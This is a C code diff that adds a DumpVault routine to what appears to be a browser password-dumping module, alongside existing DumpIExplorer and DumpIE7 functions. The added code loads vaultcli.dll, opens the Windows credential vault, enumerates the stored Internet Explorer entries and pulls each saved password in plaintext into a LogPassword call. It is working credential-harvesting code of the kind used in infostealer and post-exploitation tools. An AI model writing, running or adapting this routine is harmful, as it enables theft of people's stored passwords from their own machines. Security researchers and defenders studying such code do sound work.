@@ -478,10 +478,82 @@ void DumpIEpstorage(void)
 	FreeLibrary(hpsDLL);
 }*/
 
+typedef struct {
+	DWORD schema_elem_id;
+	DWORD unk1;
+	DWORD unk2;
+	DWORD unk3;
+	WCHAR *name;
+} vault_entry_s;
+
+typedef struct {
+	GUID schema;
+	WCHAR *program;
+	vault_entry_s *resource;
+	vault_entry_s *user;
+	vault_entry_s *password;
+	BYTE unk[24];
+} vault_cred_s;
+
+typedef unsigned int (__stdcall *VaultOpenVault_t)(_GUID *pVaultId, unsigned int dwFlags, void **pVaultHandle); 
+typedef unsigned int (__stdcall *VaultEnumerateItems_t)(void *VaultHandle, unsigned int dwFlags, DWORD *count, vault_cred_s **vault_cred); 
+typedef unsigned int (__stdcall *VaultGetItem_t)(void *VaultHandle, _GUID *pSchemaId, vault_entry_s *pResource, vault_entry_s *pIdentity, vault_entry_s *pPackageSid, HWND__ *hwndOwner, unsigned int dwFlags, vault_cred_s **ppItem);
+typedef unsigned int (__stdcall *VaultCloseVault_t)(void **pVaultHandle);
+typedef void (__stdcall *VaultFree_t)(void *pMemory);
+
+void DumpVault()
+{
+	void *vhandle = NULL;
+	VaultOpenVault_t pVaultOpenVault = NULL;
+	VaultEnumerateItems_t pVaultEnumerateItems = NULL;
+	VaultGetItem_t pVaultGetItem = NULL;
+	VaultCloseVault_t pVaultCloseVault = NULL;
+	VaultFree_t pVaultFree = NULL;
+	GUID guid_vault;
+	GUID guid_schema;
+	DWORD count = 0;
+	vault_cred_s *vault_cred = NULL;
+	vault_cred_s *vault_cred_full = NULL;
+	HMODULE hmod = NULL;
+	DWORD i = 0;
+
+	if (CLSIDFromString(L"{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}", &guid_vault)  != S_OK)
+		return;
+	if (CLSIDFromString(L"{3CCD5499-87A8-4B10-A215-608888DD3B55}", &guid_schema) != S_OK)
+		return;
+
+	hmod = LoadLibrary("vaultcli.dll");
+	if (hmod == NULL)
+		return;
+
+	pVaultOpenVault = (VaultOpenVault_t)GetProcAddress(hmod, "VaultOpenVault");
+	pVaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(hmod, "VaultEnumerateItems");
+	pVaultGetItem = (VaultGetItem_t)GetProcAddress(hmod, "VaultGetItem");
+	pVaultCloseVault = (VaultCloseVault_t)GetProcAddress(hmod, "VaultCloseVault");
+	pVaultFree = (VaultFree_t)GetProcAddress(hmod, "VaultFree");
+
+	if (pVaultOpenVault && pVaultEnumerateItems && pVaultGetItem && pVaultCloseVault && pVaultFree) {
+		if (pVaultOpenVault(&guid_vault, 0, &vhandle) == S_OK) {
+			if (pVaultEnumerateItems(vhandle, 0x200, &count, &vault_cred) == S_OK) {
+				for (i=0; i<count; i++) {
+					if (pVaultGetItem(vhandle, &guid_schema, vault_cred[i].resource, vault_cred[i].user, 0, 0, 0, &vault_cred_full) == S_OK) {
+						LogPassword(L"IExplorer", vault_cred[i].resource->name, vault_cred[i].user->name, vault_cred_full->password->name);						
+						pVaultFree(vault_cred_full);
+						vault_cred_full = NULL;
+					}
+				}
+				pVaultFree(vault_cred);
+			}
+			pVaultCloseVault(&vhandle);
+		}
+	} 
+	FreeLibrary(hmod);
+}
 
 int DumpIExplorer(void)
 {
 	//DumpIEpstorage();
+	DumpVault();
 	DumpIE7();
 	
 	return 0;
